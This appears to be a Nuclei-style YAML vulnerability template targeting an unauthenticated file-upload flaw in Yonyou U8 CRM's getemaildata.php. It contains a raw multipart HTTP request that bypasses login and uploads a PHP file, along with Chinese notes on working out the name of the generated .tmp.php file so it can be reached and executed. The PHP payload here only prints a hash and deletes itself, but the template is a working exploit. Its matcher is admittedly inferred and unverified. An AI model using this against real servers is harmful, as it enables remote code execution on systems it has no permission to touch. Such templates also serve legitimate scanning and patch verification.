id: poc-spv416ge8hhaf2p5
info:
  name: 用友-U8-CRM-getemaildata文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2024
http:
- raw:
  - 'POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Content-Type: multipart/form-data; boundary=----hjGHJGJHgjkhkhygutcvyvlbhj

    Content-Length: 199


    ------hjGHJGJHgjkhkhygutcvyvlbhj

    Content-Disposition: form-data; name="file"; filename="ceshi.php "

    Content-Type: text/plain


    <?php echo md5(''666'');unlink(__FILE__);?>

    ------hjGHJGJHgjkhkhygutcvyvlbhj


    上传文件为C:\\U8SOFT\\turbocrm70\\code\\www\\tmpfile\\mhtBBF8.tmp.mht，因为.mht文件不能被服务器解析，所以上传的代码无法执行


    但是上传文件的同时会在相同的目录下生成一个.tmp.php文件，访问格式为updxxx.tmp.php

    xxx内容由mhtBBF8.tmp.mht的文件名中的16进制数（BBF8）决定


    xxx=BBF8→十进制（48120-1）→16进制（bbf7）'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
